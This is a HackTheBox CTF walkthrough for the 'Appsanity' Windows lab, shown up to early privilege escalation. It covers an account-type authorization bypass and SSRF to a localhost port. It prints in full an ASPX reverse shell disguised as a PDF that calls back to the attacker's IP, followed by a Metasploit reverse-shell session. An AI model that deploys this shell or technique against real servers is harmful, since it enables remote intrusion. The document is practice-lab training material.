# HackTheBox Appsanity

Hard level CTF lab machine of the HackTheBox platform running on Windows OS, where we will exploit authorization bypass, SSRF and load our own shell. To increase privileges, we will reverse DotNet application and another binary application, in which we will find the vulnerability and exploit it.

## Service Overview

To scan machine 10.10.11.238 we will use rustscan:

```bash
$ wget https://github.com/RustScan/RustScan/files/9473239/rustscan_2.1.0_both.zip
$ unzip rustscan_2.1.0_both.zip
$ dpkg -i rustscan_2.1.0_amd64.deb
$ rustscan --ulimit=5000 --range=1-65535 -a 10.10.11.238 -- -A -sC
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.238:80
Open 10.10.11.238:443
Open 10.10.11.238:5985

[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sC" on ip 10.10.11.238
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-29 22:13 EET
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:13
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE: Active NSE Script Threads: 1 (0 waiting)
NSE Timing: About 0.00% done
Completed NSE at 22:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:13
Completed NSE at 22:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:13
Completed NSE at 22:13, 0.00s elapsed
Initiating Ping Scan at 22:13
Scanning 10.10.11.238 [4 ports]
Completed Ping Scan at 22:13, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:13
Completed Parallel DNS resolution of 1 host. at 22:13, 0.05s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 22:13
Scanning 10.10.11.238 [3 ports]
Discovered open port 443/tcp on 10.10.11.238
Discovered open port 5985/tcp on 10.10.11.238
Discovered open port 80/tcp on 10.10.11.238
Completed SYN Stealth Scan at 22:13, 0.14s elapsed (3 total ports)
Initiating Service scan at 22:13
Scanning 3 services on 10.10.11.238
Completed Service scan at 22:13, 14.56s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.11.238
Retrying OS detection (try #2) against 10.10.11.238
Initiating Traceroute at 22:14
Completed Traceroute at 22:14, 0.11s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 22:14
Completed Parallel DNS resolution of 2 hosts. at 22:14, 0.04s elapsed
DNS resolution of 2 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.11.238.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:14
Completed NSE at 22:14, 5.13s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:14
Completed NSE at 22:14, 0.74s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:14
Completed NSE at 22:14, 0.00s elapsed
Nmap scan report for 10.10.11.238
Host is up, received syn-ack ttl 127 (0.081s latency).
Scanned at 2023-10-29 22:13:44 EET for 25s

PORT     STATE SERVICE REASON          VERSION
80/tcp   open  http    syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://meddigi.htb/
443/tcp  open  https?  syn-ack ttl 127
5985/tcp open  http    syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|7 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.93%E=4%D=10/29%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=653EBD11%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=10F%TI=I%II=I%SS=S%TS=U)
OPS(O1=M54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54ENNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M54ENW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   51.83 ms  10.10.16.1
2   102.24 ms 10.10.11.238

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:14
Completed NSE at 22:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:14
Completed NSE at 22:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:14
Completed NSE at 22:14, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.24 seconds
           Raw packets sent: 92 (7.732KB) | Rcvd: 32 (2.008KB)
```

## Web service

Going to the web service on port 80 redirects to port 443 and the meddigi.htb domain, so let's add this host to /etc/hosts.

```bash
$ sudo nano /etc/hosts
10.10.11.238 meddigi.htb
```

By intercepting requests in Burp Suite, we find that the application is written in ASP DotNet Core.

Let's search for subdomains using gobuster.

```bash
$ gobuster vhost -u https://meddigi.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20 -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          https://meddigi.htb
[+] Method:       GET
[+] Threads:      20
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
Found: portal.meddigi.htb (Status: 200) [Size: 2976]

===============================================================
```

Add the found subdomain to /etc/hosts in the same way.

Let's register ourselves a user on the first site, log in, and discover the JWT token in the cookie under the name access_token.

```json
{
	"Request Cookies": {
		".AspNetCore.Antiforgery.ML5pX7jOz00": "CfDJ8HxKsHomPuZJgV-R4DucUJXqkSrisLiubiR7v2GSUGiV7CuwuqyvWJaW5O0dqwLlykW-ICMd0tI1qD5SpVvvMTcL7-xsnFX8I9gyDRJTVJbjZOUajhjcIQVX86wFmxP-36ZvQHDgFpzUUGE_b4pz4ng",
		"access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjciLCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJuYmYiOjE2OTg2NTc5NjMsImV4cCI6MTY5ODY2MTU2MywiaWF0IjoxNjk4NjU3OTYzLCJpc3MiOiJNZWREaWdpIiwiYXVkIjoiTWVkRGlnaVVzZXIifQ.GQt923q3L2n_gxVMiBZgDn9IHEfoaF9kp7o2rpW-ExQ"
	}
}
```

We decode it and get the following values:

```json
{
  "unique_name": "7",
  "email": "test@test.com",
  "nbf": 1698657963,
  "exp": 1698661563,
  "iat": 1698657963,
  "iss": "MedDigi",
  "aud": "MedDigiUser"
}
```
Let's run the registration again and find that we have an ```Acctype``` field.

```bash
Name=Qwer&LastName=Qwer&Email=test%40f.com&Password=test1234&ConfirmPassword=test1234&DateOfBirth=1990-07-10&PhoneNumber=0999999999&Country=UK&Acctype=1&__RequestVerificationToken=CfDJ8HxKsHomPuZJgV-R4DucUJWLxTAyQwRfjdhMOSGgkftl-m68vB-IIfKCCJXeEl5Bz57dY32VWbkjirXh_YvmJ1ErZ5JzwOedTPzmGVVTFKtPir4EsAmr4rK9X3Vp002pVLM3KHjThlDUE-Vcr-nyKnQ
```

We'll send a request to ```Repeater``` and change ```Acctype``` to 2. 

```bash
Name=Qwer&LastName=Qwer&Email=test%40f.com&Password=test1234&ConfirmPassword=test1234&DateOfBirth=1990-07-10&PhoneNumber=0999999999&Country=UK&Acctype=2&__RequestVerificationToken=CfDJ8HxKsHomPuZJgV-R4DucUJWLxTAyQwRfjdhMOSGgkftl-m68vB-IIfKCCJXeEl5Bz57dY32VWbkjirXh_YvmJ1ErZ5JzwOedTPzmGVVTFKtPir4EsAmr4rK9X3Vp002pVLM3KHjThlDUE-Vcr-nyKnQ
```

After login `https://meddigi.htb/Profile`, we have a doctor's account.

Copy the access_token cookie and its value and add it to `portal.meddigi.htb`: **```Inspect -> Storage -> Cookies```**, then reload the page and access the portal.

```json
{
	"Request Cookies": {
		".AspNetCore.Antiforgery.ML5pX7jOz00": "CfDJ8HxKsHomPuZJgV-R4DucUJWSgmxnFp9evmx4UPf_sTZLLRV4xl9veVt0famp_AfR8H2j-79Y7B-1Iwk2w8qHpRXs20ORyRjzaXltxv7elwC1AoDtRpTUsYfcEdjGcz3Yd6iP2HAl5fc3d6WlvV9OHSM",
		"access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjciLCJlbWFpbCI6InRlc3RAZi5jb20iLCJuYmYiOjE2OTg2NjAyMDgsImV4cCI6MTY5ODY2MzgwOCwiaWF0IjoxNjk4NjYwMjA4LCJpc3MiOiJNZWREaWdpIiwiYXVkIjoiTWVkRGlnaVVzZXIifQ.4otxqk_YbT4pVqX8K5E-aNNTZw6uwKIJi3E3Qy6mqO4"
	}
}
```

We can go to **```Issue Prescription```** in the side menu and see the mail and link box that generates the preview.
We try entering different addresses and find something ```http://127.0.0.1:8080```.

We get a link of the form: ```https://portal.meddigi.htb/ViewReport.aspx?file=eefeccb8-4c86-45b4-a38d-81754324a11b_Cardiology_Report_1.pdf```

It's worth noting that PDF files can be uploaded in the Upload Report menu, and that's where the SSRF vulnerability is found.

Next, try loading any valid PDF file and pull its initial signature, it should be similar to ```%PDF-1.7```.

Take the ASPX reverse shell ```https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx``` and change its port and IP address to your own.

```csharp
%PDF-1.7
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<script runat="server">
//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
//Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip

        protected void Page_Load(object sender, EventArgs e)
    {
            String host = "10.10.16.48"; //CHANGE THIS
            int port = 4444; ////CHANGE THIS

        CallbackShell(host, port);
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public String lpReserved;
        public String lpDesktop;
        public String lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int Length;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }


    [DllImport("kernel32.dll")]
    static extern bool CreateProcess(string lpApplicationName,
       string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,
       uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
       [In] ref STARTUPINFO lpStartupInfo,
       out PROCESS_INFORMATION lpProcessInformation);

    public static uint INFINITE = 0xFFFFFFFF;

    [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
    internal static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds);

    internal struct sockaddr_in
    {
        public short sin_family;
        public short sin_port;
        public int sin_addr;
        public long sin_zero;
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr GetStdHandle(int nStdHandle);

    [DllImport("kernel32.dll")]
    static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);

    public const int STD_INPUT_HANDLE = -10;
    public const int STD_OUTPUT_HANDLE = -11;
    public const int STD_ERROR_HANDLE = -12;

    [DllImport("kernel32")]
    static extern bool AllocConsole();


    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
                                            [In] SocketType socketType,
                                            [In] ProtocolType protocolType,
                                            [In] IntPtr protocolInfo,
                                            [In] uint group,
                                            [In] int flags
                                            );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern int inet_addr([In] string cp);
    [DllImport("ws2_32.dll")]
    private static extern string inet_ntoa(uint ip);

    [DllImport("ws2_32.dll")]
    private static extern uint htonl(uint ip);

    [DllImport("ws2_32.dll")]
    private static extern uint ntohl(uint ip);

    [DllImport("ws2_32.dll")]
    private static extern ushort htons(ushort ip);

    [DllImport("ws2_32.dll")]
    private static extern ushort ntohs(ushort ip);


   [DllImport("WS2_32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
   internal static extern int connect([In] IntPtr socketHandle,[In] ref sockaddr_in socketAddress,[In] int socketAddressSize);

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int send(
                                [In] IntPtr socketHandle,
                                [In] byte[] pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int recv(
                                [In] IntPtr socketHandle,
                                [In] IntPtr pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int closesocket(
                                       [In] IntPtr socketHandle
                                       );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern IntPtr accept(
                                  [In] IntPtr socketHandle,
                                  [In, Out] ref sockaddr_in socketAddress,
                                  [In, Out] ref int socketAddressSize
                                  );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int listen(
                                  [In] IntPtr socketHandle,
                                  [In] int backlog
                                  );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int bind(
                                [In] IntPtr socketHandle,
                                [In] ref sockaddr_in  socketAddress,
                                [In] int socketAddressSize
                                );


   public enum TOKEN_INFORMATION_CLASS
   {
       TokenUser = 1,
       TokenGroups,
       TokenPrivileges,
       TokenOwner,
       TokenPrimaryGroup,
       TokenDefaultDacl,
       TokenSource,
       TokenType,
       TokenImpersonationLevel,
       TokenStatistics,
       TokenRestrictedSids,
       TokenSessionId
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public static extern bool GetTokenInformation(
       IntPtr hToken,
       TOKEN_INFORMATION_CLASS tokenInfoClass,
       IntPtr TokenInformation,
       int tokeInfoLength,
       ref int reqLength);

   public enum TOKEN_TYPE
   {
       TokenPrimary = 1,
       TokenImpersonation
   }

   public enum SECURITY_IMPERSONATION_LEVEL
   {
       SecurityAnonymous,
       SecurityIdentification,
       SecurityImpersonation,
       SecurityDelegation
   }


   [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
   public extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment,
       String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

   [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
   public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLeve, TOKEN_TYPE TokenType,
       ref IntPtr DuplicateTokenHandle);



   const int ERROR_NO_MORE_ITEMS = 259;

   [StructLayout(LayoutKind.Sequential)]
   struct TOKEN_USER
   {
       public _SID_AND_ATTRIBUTES User;
   }

   [StructLayout(LayoutKind.Sequential)]
   public struct _SID_AND_ATTRIBUTES
   {
       public IntPtr Sid;
       public int Attributes;
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool LookupAccountSid
   (
       [In, MarshalAs(UnmanagedType.LPTStr)] string lpSystemName,
       IntPtr pSid,
       StringBuilder Account,
       ref int cbName,
       StringBuilder DomainName,
       ref int cbDomainName,
       ref int peUse

   );

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool ConvertSidToStringSid(
       IntPtr pSID,
       [In, Out, MarshalAs(UnmanagedType.LPTStr)] ref string pStringSid);


   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern bool CloseHandle(
       IntPtr hHandle);

   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);
   [Flags]
   public enum ProcessAccessFlags : uint
   {
       All = 0x001F0FFF,
       Terminate = 0x00000001,
       CreateThread = 0x00000002,
       VMOperation = 0x00000008,
       VMRead = 0x00000010,
       VMWrite = 0x00000020,
       DupHandle = 0x00000040,
       SetInformation = 0x00000200,
       QueryInformation = 0x00000400,
       Synchronize = 0x00100000
   }

   [DllImport("kernel32.dll")]
   static extern IntPtr GetCurrentProcess();

   [DllImport("kernel32.dll")]
   extern static IntPtr GetCurrentThread();


   [DllImport("kernel32.dll", SetLastError = true)]
   [return: MarshalAs(UnmanagedType.Bool)]
   static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
      IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle,
      uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    [DllImport("psapi.dll", SetLastError = true)]
    public static extern bool EnumProcessModules(IntPtr hProcess,
    [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] uint[] lphModule,
    uint cb,
    [MarshalAs(UnmanagedType.U4)] out uint lpcbNeeded);

    [DllImport("psapi.dll")]
    static extern uint GetModuleBaseName(IntPtr hProcess, uint hModule, StringBuilder lpBaseName, uint nSize);

    public const uint PIPE_ACCESS_OUTBOUND = 0x00000002;
    public const uint PIPE_ACCESS_DUPLEX = 0x00000003;
    public const uint PIPE_ACCESS_INBOUND = 0x00000001;
    public const uint PIPE_WAIT = 0x00000000;
    public const uint PIPE_NOWAIT = 0x00000001;
    public const uint PIPE_READMODE_BYTE = 0x00000000;
    public const uint PIPE_READMODE_MESSAGE = 0x00000002;
    public const uint PIPE_TYPE_BYTE = 0x00000000;
    public const uint PIPE_TYPE_MESSAGE = 0x00000004;
    public const uint PIPE_CLIENT_END = 0x00000000;
    public const uint PIPE_SERVER_END = 0x00000001;
    public const uint PIPE_UNLIMITED_INSTANCES = 255;

    public const uint NMPWAIT_WAIT_FOREVER = 0xffffffff;
    public const uint NMPWAIT_NOWAIT = 0x00000001;
    public const uint NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;

    public const uint GENERIC_READ = (0x80000000);
    public const uint GENERIC_WRITE = (0x40000000);
    public const uint GENERIC_EXECUTE = (0x20000000);
    public const uint GENERIC_ALL = (0x10000000);

    public const uint CREATE_NEW = 1;
    public const uint CREATE_ALWAYS = 2;
    public const uint OPEN_EXISTING = 3;
    public const uint OPEN_ALWAYS = 4;
    public const uint TRUNCATE_EXISTING = 5;

    public const int INVALID_HANDLE_VALUE = -1;

    public const ulong ERROR_SUCCESS = 0;
    public const ulong ERROR_CANNOT_CONNECT_TO_PIPE = 2;
    public const ulong ERROR_PIPE_BUSY = 231;
    public const ulong ERROR_NO_DATA = 232;
    public const ulong ERROR_PIPE_NOT_CONNECTED = 233;
    public const ulong ERROR_MORE_DATA = 234;
    public const ulong ERROR_PIPE_CONNECTED = 535;
    public const ulong ERROR_PIPE_LISTENING = 536;

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateNamedPipe(
        String lpName,
        uint dwOpenMode,
        uint dwPipeMode,
        uint nMaxInstances,
        uint nOutBufferSize,
        uint nInBufferSize,
        uint nDefaultTimeOut,
        IntPtr pipeSecurityDescriptor
        );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ConnectNamedPipe(
        IntPtr hHandle,
        uint lpOverlapped
        );

    [DllImport("Advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateNamedPipeClient(
        IntPtr hHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetNamedPipeHandleState(
        IntPtr hHandle,
        IntPtr lpState,
        IntPtr lpCurInstances,
        IntPtr lpMaxCollectionCount,
        IntPtr lpCollectDataTimeout,
        StringBuilder lpUserName,
        int nMaxUserNameSize
        );

    protected void CallbackShell(string server, int port)
    {

        string request = "Spawn Shell...\n";
        Byte[] bytesSent = Encoding.ASCII.GetBytes(request);

        IntPtr oursocket = IntPtr.Zero;

        sockaddr_in socketinfo;
        oursocket = WSASocket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.IP, IntPtr.Zero, 0, 0);
        socketinfo = new sockaddr_in();
        socketinfo.sin_family = (short) AddressFamily.InterNetwork;
        socketinfo.sin_addr = inet_addr(server);
        socketinfo.sin_port = (short) htons((ushort)port);
        connect(oursocket, ref socketinfo, Marshal.SizeOf(socketinfo));
        send(oursocket, bytesSent, request.Length, 0);
        SpawnProcessAsPriv(oursocket);
        closesocket(oursocket);
    }

    protected void SpawnProcess(IntPtr oursocket)
    {
        bool retValue;
        string Application = Environment.GetEnvironmentVariable("comspec");
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        STARTUPINFO sInfo = new STARTUPINFO();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.Length = Marshal.SizeOf(pSec);
        sInfo.dwFlags = 0x00000101;
        sInfo.hStdInput = oursocket;
        sInfo.hStdOutput = oursocket;
        sInfo.hStdError = oursocket;
        retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
    }

    protected void SpawnProcessAsPriv(IntPtr oursocket)
    {
        bool retValue;
        string Application = Environment.GetEnvironmentVariable("comspec");
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        STARTUPINFO sInfo = new STARTUPINFO();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.Length = Marshal.SizeOf(pSec);
        sInfo.dwFlags = 0x00000101;
        IntPtr DupeToken = new IntPtr(0);
        sInfo.hStdInput = oursocket;
        sInfo.hStdOutput = oursocket;
        sInfo.hStdError = oursocket;
        if (DupeToken == IntPtr.Zero)
            retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        else
            retValue = CreateProcessAsUser(DupeToken, Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
        CloseHandle(DupeToken);
    }
    </script>
```

At the beginning of the shell, we write the metadata from the valid PDF we defined above, and then simply upload the resulting file as a PDF report, keeping our extension.

```
Examination report sent to the management. 
```

Again through **```Issue Prescriptions```** we look at the list of files and see our shell:

```bash
https://portal.meddigi.htb/ViewReport.aspx?file=1a4a869c-226f-462b-a2a1-849416096623_sh.aspx
```

Change the domain in the link to ```http://127.0.0.1:8080```. Example:.

```bash
http://127.0.0.1:8080/ViewReport.aspx?file=1a4a869c-226f-462b-a2a1-849416096623_sh.aspx
```

Run netcat and send the link, then catch the connection.

```bash
$ nc -lnvp 4444
listening on [any] 4444 ...
id
connect to [10.10.16.48] from (UNKNOWN) [10.10.11.238] 60864
Spawn Shell...
Microsoft Windows [Version 10.0.19045.3570]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
appsanity\svc_exampanel
```

## User flag

```bash
C:\Users\svc_exampanel\Desktop>type user.txt
type user.txt
c786d3591c3da5a912c88c9e6ae5d2e0
```

## Privilege escalation

Run msfconsole and configuration meterpreter shell. Catch the connection as above:

```bash
$ msfconsole -q
[msf](Jobs:0 Agents:0) >> use windows/shell_reverse_tcp
[msf](Jobs:0 Agents:0) payload(windows/shell_reverse_tcp) >> options

Module options (payload/windows/shell_reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) payload(windows/shell_reverse_tcp) >> set LHOST 10.10.16.48
LHOST => 10.10.16.48
[msf](Jobs:0 Agents:0) payload(windows/shell_reverse_tcp) >> exploit
[*] Payload Handler Started as Job 0

[*] Started reverse TCP handler on 10.10.16.48:4444
[msf](Jobs:1 Agents:0) payload(windows/shell_reverse_tcp) >> [*] Command shell session 1 opened (10.10.16.48:4444 -> 10.10.11.238:64023) at 2023-10-30 16:11:15 +0200

[msf](Jobs:1 Agents:1) payload(windows/shell_reverse_tcp) >> sessions

Active sessions
===============

  Id  Name  Type               Information                         Connection
  --  ----  ----               -----------                         ----------
  1         shell x86/windows  Shell Banner: Spawn Shell... -----  10.10.16.48:4444 -> 10.10.11.238:64023 (10.10.11.238)

[msf](Jobs:1 Agents:1) payload(windows/shell_reverse_tcp) >> sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.16.48:4433
[msf](Jobs:2 Agents:1) payload(windows/shell_reverse_tcp) >>
[*] Sending stage (200774 bytes) to 10.10.11.238
[*] Meterpreter session 2 opened (10.10.16.48:4433 -> 10.10.11.238:64024) at 2023-10-30 16:14:21 +0200
[*] Stopping exploit/multi/handler

[msf](Jobs:1 Agents:2) payload(windows/shell_reverse_tcp) >> sessions -l

Active sessions
===============

  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  1         shell x86/windows        Shell Banner: Spawn Shell... -----   10.10.16.48:4444 -> 10.10.11.238:64023 (10.10.11.238)
  2         meterpreter x64/windows  APPSANITY\svc_exampanel @ APPSANITY  10.10.16.48:4433 -> 10.10.11.238:64024 (10.10.11.238)

[msf](Jobs:1 Agents:2) payload(windows/shell_reverse_tcp) >> sessions 2

(Meterpreter 2)(c:\windows\system32\inetsrv) >
```

Run netstat and see the application running on port 100. Forward the port to the local machine (in my case it will be port 10100).

```bash
(Meterpreter 2)(c:\windows\system32\inetsrv) > netstat -a

Connection list
===============

    Proto  Local address       Remote address      State        User  Inode  PID/Program name
    -----  -------------       --------------      -----        ----  -----  ----------------
    tcp    0.0.0.0:80          0.0.0.0:*           LISTEN       0     0      4/System
    tcp    0.0.0.0:100         0.0.0.0:*           LISTEN       0     0      5812/ReportManagement.exe
    tcp    0.0.0.0:135         0.0.0.0:*           LISTEN       0     0      920/svchost.exe
    tcp    0.0.0.0:443         0.0.0.0:*           LISTEN       0     0      4/System
    tcp    0.0.0.0:445         0.0.0.0:*           LISTEN       0     0      4/System
    tcp    0.0.0.0:5040        0.0.0.0:*           LISTEN       0     0      2928/svchost.exe
    tcp    0.0.0.0:5985        0.0.0.0:*           LISTEN       0     0      4/System
    tcp    0.0.0.0:8080        0.0.0.0:*           LISTEN       0     0      4/System
    tcp    0.0.0.0:47001       0.0.0.0:*           LISTEN       0     0      4/System
    tcp    0.0.0.0:49664       0.0.0.0:*           LISTEN       0     0      684/lsass.exe
